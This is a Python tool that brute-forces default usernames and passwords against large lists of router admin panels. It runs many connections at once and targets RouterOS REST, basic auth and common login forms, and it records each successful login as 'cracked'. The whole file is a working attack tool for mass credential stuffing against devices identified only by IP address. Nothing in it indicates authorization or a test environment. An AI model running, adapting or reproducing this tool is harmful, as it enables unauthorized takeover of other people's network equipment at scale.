#!/usr/bin/env python3
"""Generic router-panel credential tester.

Success detection is by DIFFERENCE from an unauthenticated baseline:
  - HTTP 302/303 to a non-login location
  - 200 whose body no longer contains a password input
  - OpenWrt stok session URL / MikroTik webfig session
  - RouterOS v7 REST: 401 -> 200 on /rest/system/resource

Usage: router_crack.py --in panels.json --shard 0/20 --out out/ [--creds creds.txt]
"""
import argparse, asyncio, json, os, re, ssl, base64, sys
from collections import Counter

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"
PW_INPUT = re.compile(r'type\s*=\s*["\']?password', re.I)
LOGINISH = re.compile(r"(login|signin|sign-in|auth|dologin|login\.cgi|login\.asp)", re.I)

DEFAULT_CREDS = [
 ("admin","admin"),("admin",""),("admin","1234"),("admin","12345"),("admin","123456"),
 ("admin","password"),("admin","admin123"),("admin","12345678"),("root","root"),
 ("root","admin"),("root","1234"),("root","password"),("admin","1"),("admin","1111"),
 ("admin","0000"),("admin","admin1"),("admin","pass"),("admin","qwerty"),
 ("user","user"),("support","support"),("admin","default"),("admin","system"),
 ("admin","adminadmin"),("admin","1234abcd"),("admin","Admin123"),("admin","admin@123"),
 ("admin","password1"),("admin","1234567890"),("cisco","cisco"),("ubnt","ubnt"),
 ("admin","root"),("admin","888888"),("admin","666666"),("admin","112233"),("admin","abc123"),
 ("admin","admin1234"),("admin","guest"),("admin","changeme"),("admin","secret"),
 ("admin","master"),("admin","network"),("admin","internet"),("admin","wireless"),
 ("admin","router"),("admin","wifi"),("admin","home"),("admin","house"),
]

def rx_ok(pw):
    return pw not in ("",) or True

async def http(host, port, method="GET", path="/", scheme="http", body=None,
               headers=None, timeout=7, read=24000):
    try:
        if scheme == "https":
            ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=timeout)
        else:
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
    except Exception:
        return None
    try:
        hdrs = [f"{method} {path} HTTP/1.1", f"Host: {host}:{port}", f"User-Agent: {UA}",
                "Accept: text/html,application/xhtml+xml,*/*;q=0.8",
                "Connection: close"]
        if headers:
            for k, v in headers.items(): hdrs.append(f"{k}: {v}")
        data = b""
        if body is not None:
            data = body.encode()
            hdrs.append("Content-Type: application/x-www-form-urlencoded")
            hdrs.append(f"Content-Length: {len(data)}")
        w.write(("\r\n".join(hdrs) + "\r\n\r\n").encode() + data)
        await asyncio.wait_for(w.drain(), timeout=timeout)
        buf = b""
        while True:
            chunk = await asyncio.wait_for(r.read(8192), timeout=timeout)
            if not chunk: break
            buf += chunk
            if len(buf) > read: break
    except Exception:
        buf = buf if 'buf' in dir() else b""
    finally:
        try: w.close()
        except Exception: pass
    if not buf: return None
    txt = buf.decode("utf-8", "ignore")
    head, _, b = txt.partition("\r\n\r\n")
    m = re.match(r"HTTP/\d\.\d\s+(\d+)", head)
    return {"status": int(m.group(1)) if m else 0, "head": head, "body": b}


def has_pw(body):
    return bool(PW_INPUT.search(body or ""))


def sess_hint(head, body):
    low = (head or "") + " " + (body or "")[:3000]
    for pat in (r"stok=[0-9a-f]{6,}", r"Session", r"webfig/#", r"sid=", r"PHPSESSID",
                r"JSESSIONID", r"cpsess", r"token="):
        if re.search(pat, low, re.I): return pat
    return None


async def try_panel(ip, port, creds, sem):
    async with sem:
        out = {"ip": ip, "port": port}
        # pick scheme
        for scheme in ("http", "https"):
            base = await http(ip, port, path="/", scheme=scheme)
            if base and base["status"]: break
        else:
            return None
        out["scheme"] = scheme
        out["baseline_status"] = base["status"]
        base_pw = has_pw(base["body"])
        out["baseline_pw_input"] = base_pw
        base_title = ""
        tm = re.search(r"<title[^>]*>(.*?)</title>", base["body"], re.I | re.S)
        if tm: base_title = re.sub(r"\s+", " ", tm.group(1))[:60]
        out["title"] = base_title

        # ---- 1. RouterOS v7 REST oracle ----
        rest = await http(ip, port, path="/rest/system/resource", scheme=scheme)
        rest_ok = rest and rest["status"] == 401
        out["rest_api"] = bool(rest_ok)

        for user, pw in creds:
            # basic auth on / and /rest/
            tok = base64.b64encode(f"{user}:{pw}".encode()).decode()
            if rest_ok:
                r = await http(ip, port, path="/rest/system/resource", scheme=scheme,
                               headers={"Authorization": f"Basic {tok}"})
                if r and r["status"] == 200:
                    out.update({"login": "OK", "method": "routeros-rest",
                                "user": user, "pw": pw, "evidence": r["body"][:200]})
                    return out
            # basic auth on /
            r = await http(ip, port, path="/", scheme=scheme, headers={"Authorization": f"Basic {tok}"})
            if r and r["status"] in (200, 302, 301) and "www-authenticate" not in r["head"].lower() and not has_pw(r["body"]):
                if r["body"][:400] != base["body"][:400] or r["status"] != base["status"]:
                    out.update({"login": "OK", "method": "basic", "user": user, "pw": pw,
                                "evidence": r["body"][:200]})
                    return out
            # form POSTs (several shapes)
            for path, fields in (
                ("/", {"username": user, "password": pw}),
                ("/", {"user": user, "pass": pw}),
                ("/", {"uname": user, "pwd": pw}),
                ("/login", {"username": user, "password": pw}),
                ("/login.cgi", {"username": user, "password": pw}),
                ("/login.cgi", {"user": user, "pass": pw}),
                ("/cgi-bin/luci", {"username": user, "password": pw}),
                ("/login.cgi", {"username": user, "pwd": pw}),
            ):
                body = "&".join(f"{k}={v}" for k, v in fields.items())
                r = await http(ip, port, method="POST", path=path, scheme=scheme, body=body)
                if not r or not r["status"]: continue
                loc = re.search(r"[Ll]ocation:\s*(\S+)", r["head"] or "")
                locs = loc.group(1) if loc else ""
                if r["status"] in (302, 303) and locs and not LOGINISH.search(locs):
                    out.update({"login": "OK", "method": f"form{path}", "user": user, "pw": pw,
                                "evidence": f"302->{locs}"})
                    return out
                if r["status"] == 200 and not has_pw(r["body"]) and base_pw and len(r["body"]) > 400:
                    sh = sess_hint(r["head"], r["body"])
                    if sh:
                        out.update({"login": "OK", "method": f"form{path}", "user": user, "pw": pw,
                                    "evidence": f"sess:{sh}"})
                        return out
        out["login"] = "FAIL"
        return out


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--in", dest="inp", required=True)
    ap.add_argument("--shard", default="0/1")
    ap.add_argument("--out", default="out")
    ap.add_argument("--conc", type=int, default=60)
    ap.add_argument("--limit", type=int, default=0)
    ap.add_argument("--creds", default="")
    ap.add_argument("--maxtries", type=int, default=12)
    args = ap.parse_args()
    i, n = (int(x) for x in args.shard.split("/"))
    os.makedirs(args.out, exist_ok=True)

    creds = list(DEFAULT_CREDS)
    if args.creds and os.path.exists(args.creds):
        for line in open(args.creds):
            line = line.strip()
            if line.count(":") >= 1:
                u, _, p = line.partition(":")
                if (u, p) not in creds: creds.append((u, p))
    creds = creds[:args.maxtries]

    rows = json.load(open(args.inp))
    seen, panels = set(), []
    for r in rows:
        k = (r["ip"], r["port"])
        if k in seen: continue
        seen.add(k); panels.append(k)
    panels = [p for j, p in enumerate(panels) if j % n == i]
    if args.limit: panels = panels[:args.limit]
    print(f"[*] shard {i}/{n}: {len(panels)} panels, {len(creds)} creds each", flush=True)

    sem = asyncio.Semaphore(args.conc)
    res, wins = [], []
    for k, t in enumerate(asyncio.as_completed([asyncio.create_task(try_panel(ip, p, creds, sem)) for ip, p in panels]), 1):
        try: r = await t
        except Exception: r = None
        if r:
            res.append(r)
            if r.get("login") == "OK":
                wins.append(r)
                print(f"  *** LOGIN {r['user']}:{r['pw']} @ {r['ip']}:{r['port']} via {r['method']} | {r.get('title','')[:40]} | {r.get('evidence','')[:80]}", flush=True)
        if k % 25 == 0:
            print(f"  {k}/{len(panels)} tested, {len(wins)} cracked", flush=True)
    json.dump(res, open(f"{args.out}/crack-{i}.json", "w"), indent=1)
    print(f"\n=== shard {i}: {len(res)} tested, {len(wins)} CRACKED ===")
    print("  status:", dict(Counter(x.get("login") for x in res)))
    print("  rest_api panels:", sum(1 for x in res if x.get("rest_api")))


if __name__ == "__main__":
    asyncio.run(main())